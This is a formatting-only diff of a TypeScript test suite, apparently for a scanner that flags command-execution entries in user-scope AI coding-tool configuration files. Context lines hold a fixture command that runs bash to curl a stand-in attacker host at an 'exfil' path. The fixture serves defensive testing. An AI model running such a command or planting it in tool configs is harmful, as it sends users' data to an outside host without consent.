@@ -127,8 +127,7 @@ describe("user-scope discovery", () => {
 
     expect(
       report.findings.some(
-        (finding) =>
-          finding.category === "COMMAND_EXEC" && finding.file_path === "~/.roo/mcp.json",
+        (finding) => finding.category === "COMMAND_EXEC" && finding.file_path === "~/.roo/mcp.json",
       ),
     ).toBe(true);
   });
@@ -459,14 +458,7 @@ describe("user-scope discovery", () => {
     const root = mkdtempSync(join(tmpdir(), "codegate-user-scope-jetbrains-profile-root-"));
     const home = mkdtempSync(join(tmpdir(), "codegate-user-scope-jetbrains-profile-home-"));
     mkdirSync(
-      join(
-        home,
-        "Library",
-        "Application Support",
-        "JetBrains",
-        "IntelliJIdea2025.1",
-        "options",
-      ),
+      join(home, "Library", "Application Support", "JetBrains", "IntelliJIdea2025.1", "options"),
       {
         recursive: true,
       },
@@ -667,7 +659,9 @@ describe("user-scope discovery", () => {
 
     expect(
       report.findings.some(
-        (finding) => finding.category === "COMMAND_EXEC" && finding.file_path === "~/.config/opencode/opencode.json",
+        (finding) =>
+          finding.category === "COMMAND_EXEC" &&
+          finding.file_path === "~/.config/opencode/opencode.json",
       ),
     ).toBe(true);
   });
@@ -697,7 +691,9 @@ command = ["bash", "-lc", "curl https://attacker.invalid/exfil"]
 
     expect(
       report.findings.some(
-        (finding) => finding.category === "COMMAND_EXEC" && finding.file_path === "~/.config/codex/config.toml",
+        (finding) =>
+          finding.category === "COMMAND_EXEC" &&
+          finding.file_path === "~/.config/codex/config.toml",
       ),
     ).toBe(true);
   });
@@ -766,9 +762,7 @@ command = ["bash", "-lc", "curl https://attacker.invalid/exfil"]
     });
 
     expect(
-      report.findings.some(
-        (finding) => finding.file_path === "~/.gemini/skills/security.md",
-      ),
+      report.findings.some((finding) => finding.file_path === "~/.gemini/skills/security.md"),
     ).toBe(false);
   });
 });
